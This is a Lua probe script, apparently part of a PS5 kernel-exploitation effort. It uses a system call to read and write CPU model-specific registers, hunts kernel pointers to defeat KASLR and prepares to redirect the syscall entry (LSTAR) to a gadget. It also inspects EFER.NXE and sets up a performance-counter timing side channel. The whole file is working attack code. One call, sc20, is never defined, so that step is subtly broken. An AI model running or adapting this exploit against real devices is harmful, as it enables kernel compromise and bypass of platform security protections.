-- CRASH_CLASS: RISKY
-- PROBE 55c: MSR-based kernel code execution via sys 626 WRMSR
--
-- Prerequisites: 54a2 confirmed WRMSR (cmd=2) works
-- Strategy:
--   1. PMC path: MSR = 0xC0010231 + idx*2, can't reach LSTAR (0xC0000082)
--   2. cmd 3-6 may use different MSR base offsets — test for LSTAR access
--   3. If we can read LSTAR → KASLR defeat (syscall entry = kernel text)
--   4. If we can write LSTAR → redirect all syscalls to our gadget
--   5. Alternative: EFER MSR to disable SMEP/SMAP
--
-- WARNING: Wrong LSTAR write = instant triple fault / panic

print("=== PROBE 55c: MSR CODE EXECUTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc626 = make_syscall(626)
local outbuf = memory.alloc(0x100)

-- ============================================================
-- Phase 1: Verify RDMSR/WRMSR round-trip on safe PMC MSR
-- ============================================================
print("[*] Phase 1: RDMSR/WRMSR round-trip verification")
print("    Target: PMC PerfEvtSel0 (MSR 0xC0010231, idx=0)")
print("")

-- Read original value
for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end
local ok, ret = pcall(function()
    return sc626(uint64(1), uint64(0), uint64(5), uint64(outbuf), uint64(0))
end)
local orig_val = nil
if ok and signed32(ret) == 0 then
    orig_val = safe_rq(outbuf)
    print("  Original MSR 0xC0010231 = " .. hexval(orig_val))
else
    print("  RDMSR failed: " .. (ok and tostring(signed32(ret)) or tostring(ret)))
end

-- Try WRMSR (cmd=2) — write 0 to disable counter
if orig_val then
    safe_wq(outbuf, uint64(0))
    local ok2, ret2 = pcall(function()
        return sc626(uint64(2), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)
    if ok2 then
        local rv = signed32(ret2)
        print("  WRMSR(0xC0010231, 0) ret=" .. rv)
        if rv == 0 then
            print("  >>> WRMSR WORKS!")
            -- Read back to verify
            for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end
            local ok3, ret3 = pcall(function()
                return sc626(uint64(1), uint64(0), uint64(5), uint64(outbuf), uint64(0))
            end)
            if ok3 and signed32(ret3) == 0 then
                print("  Read-back: " .. hexval(safe_rq(outbuf)))
            end
            -- Restore original
            safe_wq(outbuf, orig_val)
            pcall(function()
                return sc626(uint64(2), uint64(0), uint64(5), uint64(outbuf), uint64(0))
            end)
            print("  Restored original value")
        else
            print("  WRMSR returned " .. rv .. " — may not be supported")
        end
    else
        print("  WRMSR crashed: " .. tostring(ret2))
    end
end

-- ============================================================
-- Phase 2: Probe cmds 3-6 for LSTAR/KERNEL_GS_BASE access
-- ============================================================
print("")
print("[*] Phase 2: Test cmds 3-6 for non-PMC MSR ranges")
print("    Looking for LSTAR(0xC0000082), KERNEL_GS_BASE(0xC0000102)")
print("    EFER(0xC0000080), STAR(0xC0000081)")
print("")

-- Key MSRs we want to reach:
-- EFER:           0xC0000080
-- STAR:           0xC0000081
-- LSTAR:          0xC0000082
-- CSTAR:          0xC0000083
-- SFMASK:         0xC0000084
-- FS_BASE:        0xC0000100
-- GS_BASE:        0xC0000101
-- KERNEL_GS_BASE: 0xC0000102

-- For each cmd 3-6, try idx values that would map if different bases are used
-- If base is 0xC0000080: LSTAR idx=1, EFER idx=0, etc.
-- If base is 0xC0000100: KERNEL_GS_BASE idx=1

local interesting_results = {}

for cmd = 3, 6 do
    print(string.format("  --- cmd=%d ---", cmd))
    for idx = 0, 20 do
        for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

        local ok2, ret2 = pcall(function()
            return sc626(uint64(cmd), uint64(idx), uint64(5), uint64(outbuf), uint64(0))
        end)

        if ok2 then
            local rv = signed32(ret2)
            local q0 = safe_rq(outbuf)
            local sentinel = (safe_rd(outbuf) == 0xDEADBEEF)

            if rv == 0 and not sentinel then
                local h, l = get_hi_lo(q0)
                print(string.format("    idx=%2d ret=0 val=%s%s",
                    idx, hexval(q0),
                    (h >= 0xFFFF8000 and h < 0xFFFFFFFF) and "  <<< KERNEL PTR!" or ""))

                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    table.insert(interesting_results, {cmd=cmd, idx=idx, val=q0})
                    print("    >>> POSSIBLE LSTAR/SYSCALL ENTRY!")
                end
            elseif rv ~= 0 then
                -- Only print non-zero returns for first few
                if idx < 3 then
                    print(string.format("    idx=%2d ret=%d", idx, rv))
                end
            end
        else
            if idx < 3 then
                print(string.format("    idx=%2d CRASHED", idx))
            end
            break  -- if it crashes, skip remaining indices for this cmd
        end
    end
end

-- ============================================================
-- Phase 3: If we found kernel pointers, try to identify LSTAR
-- ============================================================
print("")
if #interesting_results > 0 then
    print("[*] Phase 3: Kernel pointer analysis")
    print("    Found " .. #interesting_results .. " kernel pointer(s)")
    print("")

    for _, r in ipairs(interesting_results) do
        local h, l = get_hi_lo(r.val)
        print(string.format("  cmd=%d idx=%d: %s", r.cmd, r.idx, hexval(r.val)))

        -- LSTAR should point to syscall entry (early in kernel text)
        -- Typically kernel_base + small_offset (< 0x100000)
        -- KERNEL_GS_BASE points to per-CPU data (pcpu struct)
        if l % 0x1000 == 0 then
            print("    Page-aligned — likely base address or pcpu")
        end
    end

    -- If we can write back, try LSTAR redirect
    -- THIS IS EXTREMELY DANGEROUS — wrong value = panic
    print("")
    print("[!] LSTAR write is available but EXTREMELY RISKY")
    print("[!] Wrong value = triple fault = PS5 hard reboot")
    print("[!] Only attempt if you have a known-good gadget address")
    print("")

    -- For now, just report what we found — manual LSTAR write
    -- would go here with saved_lstar and gadget_addr
else
    print("[*] Phase 3: No kernel pointers found via MSR reads")
    print("    cmd 3-6 may not expose LSTAR")
end

-- ============================================================
-- Phase 4: Read EFER to check SMEP/SMAP/NXE status
-- ============================================================
print("")
print("[*] Phase 4: EFER MSR check (if readable)")

-- EFER bits: SCE(0), LME(8), LMA(10), NXE(11), SVME(12), LMSLE(13), FFXSR(14), TCE(15)
-- Note: SMEP/SMAP are in CR4, not EFER. But EFER.NXE controls NX bit enforcement.
-- If we can clear NXE, heap becomes executable.

-- Try reading EFER through each cmd with small indices
for cmd = 1, 6 do
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end
    local ok2, ret2 = pcall(function()
        return sc626(uint64(cmd), uint64(0), uint64(5), uint64(outbuf), uint64(0))
    end)
    if ok2 and signed32(ret2) == 0 then
        local q0 = safe_rq(outbuf)
        if safe_rd(outbuf) ~= 0xDEADBEEF then
            local h, l = get_hi_lo(q0)
            -- EFER typical value: 0xD01 (SCE|LME|LMA|NXE)
            if h == 0 and l > 0 and l < 0x10000 then
                print(string.format("  cmd=%d idx=0: 0x%X — could be EFER", cmd, l))
                if l & 0x800 ~= 0 then print("    NXE is SET") end
                if l & 0x001 ~= 0 then print("    SCE (syscall enable) is SET") end
            end
        end
    end
end

-- ============================================================
-- Phase 5: Alternative — use PMC counter as timing side channel
-- ============================================================
print("")
print("[*] Phase 5: PMC timing side channel for KASLR")
print("    Even without LSTAR access, PMC can defeat KASLR")
print("    by measuring syscall latency at different addresses")

-- If we can program a PMC to count retired instructions,
-- we can measure kernel code flow to infer KASLR slide
-- Program PerfEvtSel0 to count retired instructions:
-- Event 0xC0, UnitMask 0x00, USR=1, EN=1 = 0x004100C0

local perf_config = 0x004100C0  -- retired instructions, user+en
safe_wq(outbuf, uint64(perf_config))

local ok2, ret2 = pcall(function()
    return sc626(uint64(2), uint64(0), uint64(5), uint64(outbuf), uint64(0))
end)
if ok2 and signed32(ret2) == 0 then
    print("  Programmed PMC0 for retired instructions")

    -- Read counter before and after a syscall to measure cost
    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
    pcall(function() return sc626(uint64(1), uint64(0), uint64(5), uint64(outbuf), uint64(0)) end)
    local before = safe_rq(outbuf)

    -- Do a simple syscall
    pcall(function() return sc20() end)

    for i = 0, 0x3F, 4 do safe_wd(outbuf + i, 0) end
    pcall(function() return sc626(uint64(1), uint64(0), uint64(5), uint64(outbuf), uint64(0)) end)
    local after = safe_rq(outbuf)

    print("  Before getpid: " .. hexval(before))
    print("  After getpid:  " .. hexval(after))
    if before and after then
        local bh, bl = get_hi_lo(before)
        local ah, al = get_hi_lo(after)
        local diff = (ah - bh) * 0x100000000 + (al - bl)
        print("  Instruction delta: " .. diff)
        if diff > 0 and diff < 100000 then
            print("  >>> PMC COUNTING WORKS — can use for timing side channel!")
        end
    end
else
    print("  Could not program PMC: " .. (ok2 and tostring(signed32(ret2)) or tostring(ret2)))
end

print("")
print("=== PROBE 55c COMPLETE ===")
